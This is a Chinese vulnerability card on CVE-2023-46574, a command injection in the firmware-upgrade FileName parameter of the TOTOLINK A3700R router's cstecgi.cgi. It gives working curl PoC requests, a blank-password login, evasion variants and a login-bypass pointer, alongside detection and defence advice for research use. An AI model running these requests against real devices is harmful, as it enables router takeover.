---
id: iot-totolink-a3700r-cstecgi-uploadfirmwarefile-filename-command-injection
title: TOTOLINK A3700R cstecgi.cgi UploadFirmwareFile 的 FileName 拼进 doSystem("mv %s %s") 导致命令注入（CVE-2023-46574）
type: scenario
domain: iot
path: iot
technique: totolink-cstecgi-uploadfirmwarefile-filename-dosystem-injection
aliases:
- CVE-2023-46574
- TOTOLINK 命令执行
- cstecgi.cgi 命令注入
- UploadFirmwareFile FileName
- doSystem mv 注入
- A3700R RCE
tags:
- iot
- router
- totolink
- command-injection
- dosystem
- cstecgi
- firmware-upgrade
- mips
cve:
- CVE-2023-46574
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: TOTOLINK A3700R V9.1.2u.6165_20211012
verification:
  verified_by: verifier-V544
  verified_at: '2026-11-11T20:41:22+08:00'
  notes: 已逐张核对16张图（10张超1200px读img_small，无失败）与content.md：img04反编译cstecgi.cgi确认Var=websGetVar(a1,"FileName","")→strcpy(v38,"/tmp/myImage.img")→doSystem("mv %s %s",Var,v38)；img12-15空密码登录admin/空密码、302 Location含formLoginAuth.htm?authCode=1、首页固件版本V9.1.2u.6165、Cookie SESSION_ID=2:1708017806:2；img16 curl UploadFirmwareFile FileName=";ls -a;" 回显ExportSettings.sh/cstecgi.cgi/custom.cgi/infostat.cgi及{"upgradeERR":"_MM_FwFileInvalid"}，PoC逐字一致。CVE-2023-46574与原文标题一致。affected_versions按原文固件文件名TOTOLINK_A3700R_V9.1.2u.6165_20211012.web设为TOTOLINK A3700R V9.1.2u.6165_20211012（登录页亦显示V9.1.2u.6165）。去重：与iot-totolink-boafrm-formsyscmd-syscmd-command-injection（CVE-2024-51228，boafrm/formSysCmd绝入口）及D-Link/Tenda各doSystem卡均为不同厂商/入口/CVE，dup-scan无本卡pair，保持独立。注意doSystem内部实现原文未给源码，“system/popen封装”为常规推断；登录绕过表述与原文“绕过登录”章节及authCode重定向截图一致。
---

## 一句话结论

TOTOLINK A3700R 的 `cstecgi.cgi` 在处理 `UploadFirmwareFile` 请求时，用 `websGetVar` 取出 `FileName` 后直接拼进 `doSystem("mv %s %s", FileName, "/tmp/myImage.img")`，没有任何字符过滤或路径校验；带有效 `SESSION_ID` 提交 `FileName:";ls -a;"`，shell 会把 mv 命令拆开并执行注入的命令（CVE-2023-46574）。

## 原理

- **入口**：`/cgi-bin/cstecgi.cgi` 的 JSON 请求 `{"topicurl":"UploadFirmwareFile","FileName":"<值>"}`，这是固件升级功能的预处理步骤——把上传的临时文件移动到固定路径 `/tmp/myImage.img`。
- **污点流**：`Var = websGetVar(a1, "FileName", "")` 读取用户提供的文件名 → `strcpy(v38, "/tmp/myImage.img")` 生成目标路径 → `doSystem("mv %s %s", Var, v38)`。`doSystem` 是厂商封装的 shell 执行函数（内部拼接命令后交给 system/popen）。
- **为什么可注入**：`FileName` 未经白名单/转义直接进入格式化串的 `%s`，最终命令形如 `mv <FileName> /tmp/myImage.img`；攻击者让 FileName 以 `;` 开头（如 `;ls -a;`）即可结束 mv 并执行任意命令。即使 mv 因参数错误失败，注入的命令也已执行；响应里仍返回业务错误（如 `MM_FwFileInvalid`），但命令输出/效果不受影响。
- **前置条件**：CGI 只校验 `SESSION_ID` 会话存在，不要求管理员二次确认；设备默认无密码时可直接空密码登录，或利用同系列 `formLoginAuth.htm?authCode=1` 逻辑绕过登录获得会话。
- **影响**：以 root 运行的路由器 Web 进程执行任意命令 = 设备完全失陷（读取配置/NVRAM 凭据、植入后门、加入僵尸网络）。

## 触发条件

- 目标为 TOTOLINK A3700R 受影响固件（原文 V9.1.2u.6165_20211012；版本区间以厂商公告为准）。
- 管理面 `/cgi-bin/cstecgi.cgi` 可达（默认内网/管理 VLAN；仿真环境为 127.0.0.1）。
- 拥有有效 `SESSION_ID`（已登录、空密码登录或通过 authCode 逻辑绕过）。
- `UploadFirmwareFile` topic 在固件升级流程中可达（无需真正上传固件）。
- 仅用于授权测试与自有设备研究。

## 利用步骤

1. 搭建/接入设备：真机或 qemu mipsel 模拟（binwalk 解包固件、chroot 进 squashfs-root、`lighttpd -f lighttp/lighttpd.conf` 启动 Web）。
2. 登录获取 `SESSION_ID`：默认无密码时 `POST /cgi-bin/cstecgi.cgi?action=login`，body `username=admin&password=`，从 302 响应或 Cookie 中取 `SESSION_ID`（形如 `2:1708017806:2`）；若默认密码存在则先登录。
3. 构造并发送命令注入请求：`curl http://<target>/cgi-bin/cstecgi.cgi -b "SESSION_ID=<id>" -X POST -d '{"topicurl":"UploadFirmwareFile","FileName":";ls -a;"}'`。
4. 观察命令输出（注入命令的 stdout 会混在 CGI 响应前的输出中）或通过带外通道确认执行；可换成读文件、写文件、反弹 shell 等载荷。
5. 评估权限（通常为 root）、持久化与横向风险；清理测试文件。

## PoC

```bash
# 1) 空密码登录（默认无密码设备），拿到 SESSION_ID
curl -i 'http://127.0.0.1/cgi-bin/cstecgi.cgi?action=login' \
  -d 'username=admin&password='

# 2) 命令注入：FileName 以分号闭合 mv 命令
curl http://127.0.0.1/cgi-bin/cstecgi.cgi \
  -b "SESSION_ID=2:1708017806:2" -X POST \
  -d '{"topicurl":"UploadFirmwareFile","FileName":";ls -a;"}'
```

```text
# 响应（节选）：注入的 ls -a 输出出现在 JSON 之前
.
..
ExportSettings.sh
cstecgi.cgi
custom.cgi
infostat.cgi
{"upgradeERR": "MM_FwFileInvalid"}
```

```text
# 反编译关键代码（cstecgi.cgi）
Var = (const char *)websGetVar(a1, "FileName", "");
...
strcpy(v38, "/tmp/myImage.img");
doSystem("mv %s %s", Var, v38);   // FileName 直接进入 shell 命令
```

## 变体与关联

- 变体：同一 CGI 中其他 topic 若把参数交给 `doSystem`/`system` 同样可注入（固件升级、日志导出、诊断命令）；文件名参数也可能是 `FileName`/`FullName`/`ContentLength`。
- 变体：FileName 为分号过滤时可尝试 `|`、`&&`、`$()`、反引号、换行（URL 编码）；若经过 `mv` 参数解析，以 `--` 或空格处理。
- 变体：无会话时先利用登录绕过（如 `formLoginAuth.htm?authCode=1` 直接建会话）或默认口令。
- 关联：[[iot-totolink-nr1800x-formloginauth-authcode-login-bypass]]（同系列 lighttpd/Form_Login 的 authCode=1 登录绕过，可作前置）、[[iot-totolink-boafrm-formsyscmd-syscmd-command-injection]]（TOTOLINK 另一处 system 命令注入 CVE-2024-51228）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（MIPS 路由器系统态模拟方法）。

## 检测与防御

- 检测：审计 CGI 中 `doSystem`/`system`/`popen` 调用与 `websGetVar` 参数的拼接；监控请求体中 FileName 等参数含 `;`、`|`、`&&`、`$(`、反引号、换行；设备侧监控异常子进程（ls/cat/wget/nc）。
- 防御：升级厂商修复固件；`FileName` 只允许白名单字符/`basename` 并校验存在性；`doSystem` 不用 shell 拼接（argv 数组 execvp）、或把 mv 换成内部的文件操作 API；升级接口增加二次确认与固件签名校验；管理面限制内网访问；修改默认空密码。
- 说明：本文是 TOTOLINK A3700R 固件升级参数命令注入场景（CVE-2023-46574），severity high；仅用于授权测试与自有设备研究。
